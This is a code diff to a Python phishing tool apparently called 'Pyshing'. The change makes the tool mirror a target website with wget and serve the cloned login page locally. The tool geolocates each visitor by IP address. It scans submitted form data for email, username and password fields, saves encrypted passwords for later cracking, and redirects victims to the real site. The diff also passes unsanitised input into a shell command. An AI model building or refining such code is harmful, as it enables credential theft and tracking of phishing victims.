@@ -71,8 +71,12 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
       self.get_ip()
       self.send_response(200)
       self.end_headers()
-      file = open('site/index.html','r')
+      file = open('site/redirect.txt','r')
+      url_clone, path = Pyshing.splitUrl(file.read())
+      file = open(f"site/{url_clone[2]}/{path}","r")
       readfile = file.readlines()
+      file.close()
+
       for lines in readfile:
         self.wfile.write(lines.encode())
         
@@ -101,9 +105,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             data.append(ip)
 
 
-        if self.path != '/favicon.ico':
+        if self.path == '/':
           if len(data) == 2:
-            if not data[0] in self.ips:
+            if data[0] not in self.ips:
               date = self.get_time()
               self.ips.append(ip)
               response = requests.get("https://geolocation-db.com/json/{}&position=true".format(ip)).json()
@@ -125,7 +129,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         if 'enc' in readpost:
           print(BOLD+GREEN+f"\n[!] Possibly the password went through an encryption algorithm before sending\nSaving file {BLUE}post.txt{GREEN} for future hash crack\n"+ENDC)
         
-        forms = ['email','user','login','pass','encpass'] #Possibles forms to get the credentials
+        forms = ['email','user','pass','encpass','enc_password'] #Possibles forms to get the credentials
         
         readpost = readpost.split('&')
         count = 0
@@ -148,8 +152,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 count = 0
                 possibles = []
                 break
-            
         self.redirect()
+
         file.close()
 
     def redirect(self):
@@ -205,21 +209,28 @@ class Pyshing():
             print(RED+"[!] Invalid option!\n")
 
     def pageClone(self):
-    	try:
-    		url = str(input(BOLD+BLUE+"URL clone: "+ENDC))
-    		contents = urllib.request.urlopen(url).read()
-    		contents = contents.decode('UTF-8')
-    		file = open('site/index.html','w')
-    		file.write(contents)
-    		file.close()
-    		print(BOLD+GREEN+"[+] Main page copied... "+ENDC)
-    		del contents
-    		file = open('site/redirect.txt', 'w')
-    		file.write(url)
-    		file.close()
-    	except OSError:
-    		print(RED+"[!] Error, check your internet connection\n"+ENDC)
-    	Pyshing()
+      try:
+        url_clone = input('URL Clone: ')
+        os.system(f'wget {url_clone} --mirror -p -P site/ --wait=15 --user-agent="Mozilla/5.0"') #--convert-links
+        print(BOLD+GREEN+"[+] Website copied... "+ENDC)
+        file = open('site/redirect.txt', 'w')
+        file.write(url_clone)
+        file.close()
+        Pyshing.splitUrl(url_clone)
+
+      except OSError:
+        print(RED+"[!] Error, check your internet connection\n"+ENDC)
+      
+      Pyshing()
+
+    def splitUrl(url):
+      url_clone = url.split('/')
+      if len(url_clone) > 3 and url_clone[3] != '':
+        path = url_clone[3]
+
+      else:
+        path = 'index.html'
+      return url_clone,path
 
 '''colors'''
 BLUE = '\033[94m'
